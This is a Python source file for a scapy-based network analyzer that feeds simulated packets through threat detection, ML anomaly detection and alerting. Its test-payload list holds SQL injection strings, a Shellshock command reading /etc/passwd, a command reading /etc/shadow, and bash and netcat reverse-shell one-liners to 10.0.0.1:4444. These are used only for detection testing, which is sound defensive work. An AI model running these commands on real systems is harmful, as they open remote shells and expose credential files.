#!/usr/bin/env python3
from security_integrations import SecurityToolIntegrator
import logging
import sys
import signal
import time
import random
from scapy.all import IP, TCP, UDP, ICMP, Raw, ARP
from packet_analyzer import PacketAnalyzer
from threat_detector import ThreatDetector
from stats_collector import StatsCollector
from visualizer import Visualizer
from ml_analyzer import MLAnalyzer
from database import DatabaseManager
from notifier import NotificationManager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class NetworkAnalyzer:
    def __init__(self):
        self.running = True
        self.packet_analyzer = PacketAnalyzer()
        self.threat_detector = ThreatDetector()
        self.stats_collector = StatsCollector()
        self.visualizer = Visualizer()
        self.ml_analyzer = MLAnalyzer()
        self.db_manager = DatabaseManager()
        self.notifier = NotificationManager()
        self.security_integrator = SecurityToolIntegrator()

        # Register signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def signal_handler(self, signum, frame):
        logger.info("Stopping packet analysis...")
        self.running = False
        self.visualizer.show_final_stats(self.stats_collector.get_stats())
        sys.exit(0)

    def process_packet(self, packet):
        """Process each packet"""
        if not self.running:
            return

        try:
            # Analyze packet
            packet_info = self.packet_analyzer.analyze_packet(packet)
            if packet_info:
                # Log packet to database
                self.db_manager.log_packet(packet_info)

                # Traditional threat detection
                threats = self.threat_detector.detect_threats(packet_info)

                # External security tool analysis
                security_threats = self.security_integrator.analyze_packet(packet_info)
                if security_threats:
                    threats.extend(security_threats)

                if threats:
                    for threat in threats:
                        logger.warning(f"Potential threat detected: {threat}")
                        self.db_manager.log_threat(threat)
                        # Send notifications for high severity threats
                        if threat.get('severity') in ['high', 'critical']:
                            self.notifier.send_alert(threat, channels=['webhook'])

                # ML-based anomaly detection
                anomalies = self.ml_analyzer.detect_anomalies(packet_info)
                if anomalies:
                    for anomaly in anomalies:
                        logger.warning(f"Anomaly detected: {anomaly}")
                        self.db_manager.log_anomaly(
                            anomaly,
                            self.ml_analyzer.extract_features(packet_info),
                            self.ml_analyzer.baseline_stats
                        )
                        # Send notifications for high confidence anomalies
                        if anomaly.get('confidence', 0) > 0.8:
                            self.notifier.send_alert(anomaly, channels=['webhook'])

                # Update statistics
                self.stats_collector.update_stats(packet_info)

                # Update visualization
                if self.stats_collector.packet_count % 100 == 0:
                    self.visualizer.update_display(self.stats_collector.get_stats())

        except Exception as e:
            logger.error(f"Error processing packet: {e}")

    def generate_sample_packet(self, protocol='TCP'):
        """Generate a sample packet for testing"""
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        dst_ip = f"10.0.0.{random.randint(1, 254)}"

        if protocol == 'TCP':
            sport = random.randint(1024, 65535)
            dport = random.choice([80, 443, 8080, 22, 21])  # Common service ports
            flags = random.choice(['S', 'SA', 'A', 'PA', 'FA'])
            payload = b"" if random.random() > 0.2 else self._generate_sample_payload()
            packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags=flags)
            if payload:
                packet = packet/Raw(load=payload)
            return packet
        elif protocol == 'UDP':
            sport = random.randint(1024, 65535)
            dport = random.choice([53, 67, 68, 123, 161])  # DNS, DHCP, NTP, SNMP
            payload = self._generate_sample_payload() if random.random() > 0.5 else b""
            return IP(src=src_ip, dst=dst_ip)/UDP(sport=sport, dport=dport)/Raw(load=payload)
        elif protocol == 'ICMP':
            icmp_type = random.choice([0, 8])  # Echo reply or request
            return IP(src=src_ip, dst=dst_ip)/ICMP(type=icmp_type)
        elif protocol == 'ARP':
            return ARP(
                psrc=src_ip,
                pdst=dst_ip,
                hwsrc=self._generate_mac(),
                hwdst=self._generate_mac(),
                op=random.choice([1, 2])  # 1=request, 2=reply
            )
        return None

    def _generate_sample_payload(self):
        """Generate sample payload for testing different attack patterns"""
        payloads = [
            # SQL Injection attempts
            b"SELECT * FROM users WHERE id = 1 OR '1'='1'",
            b"UNION SELECT username,password FROM users--",

            # Command injection
            b"() { :; }; /bin/bash -c 'cat /etc/passwd'",
            b"; cat /etc/shadow; echo 'pwned'",

            # Buffer overflow simulation
            b"A" * 1000,
            b"%x" * 500,

            # Shell commands and reverse shells
            b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            b"nc -e /bin/bash 10.0.0.1 4444",

            # Web attacks
            b"GET /admin HTTP/1.1\r\nHost: example.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n",
            b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin'+OR+'1'='1",

            # Protocol-specific attacks
            b"SMBv1\x00\x00\x00\x00",  # Legacy protocol
            b"\x00\x00\x00\x00\x00\x01\x00\x00",  # Malformed packet

            # Large DNS query (potential tunneling)
            b"A" * 200 + b".example.com",
        ]
        return random.choice(payloads)

    def simulate_attack_patterns(self):
        """Simulate various attack patterns to test detection"""
        # Simulate SYN flood
        for _ in range(50):
            packet = self.generate_sample_packet('TCP')
            self.process_packet(packet)

        # Simulate port scan
        target_ip = "10.0.0.100"
        for port in range(20, 25):
            packet = IP(src="192.168.1.100", dst=target_ip)/TCP(sport=1024, dport=port, flags='S')
            self.process_packet(packet)

        # Simulate SQL injection
        packet = self.generate_sample_packet('TCP')
        packet = packet/Raw(load=b"SELECT * FROM users WHERE id = 1 OR '1'='1'")
        self.process_packet(packet)

        # Simulate command injection
        packet = self.generate_sample_packet('TCP')
        packet = packet/Raw(load=b"; cat /etc/passwd; echo 'pwned'")
        self.process_packet(packet)

        # Simulate DNS tunneling
        for _ in range(10):
            packet = IP(src="192.168.1.100", dst="10.0.0.53")/UDP(sport=random.randint(1024, 65535), dport=53)/Raw(load=b"A"*200 + b".example.com")
            self.process_packet(packet)

        # Let the system process and detect anomalies
        time.sleep(2)

    def _generate_mac(self):
        """Generate a random MAC address"""
        return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])


    def simulate_traffic(self):
        """Simulate network traffic for testing"""
        logger.info("Starting traffic simulation...")
        protocols = ['TCP', 'UDP', 'ICMP', 'ARP']
        packet_count = 0

        # Add weights to make TCP more common
        protocol_weights = [0.6, 0.3, 0.05, 0.05]  # 60% TCP, 30% UDP, 5% ICMP, 5% ARP

        try:
            while self.running and packet_count < 1000:  # Simulate 1000 packets
                protocol = random.choices(protocols, weights=protocol_weights)[0]

                if not self.running:
                    break

                packet = self.generate_sample_packet(protocol)
                if packet:
                    self.process_packet(packet)
                    packet_count += 1
                    # Variable delay to simulate more realistic traffic patterns
                    time.sleep(random.uniform(0.01, 0.05))

            logger.info(f"Simulation completed. Processed {packet_count} packets.")
            self.visualizer.show_final_stats(self.stats_collector.get_stats())

        except Exception as e:
            logger.error(f"Error during simulation: {e}")
            sys.exit(1)

def main():
    analyzer = NetworkAnalyzer()
    analyzer.simulate_attack_patterns() # changed to call the new function

if __name__ == "__main__":
    main()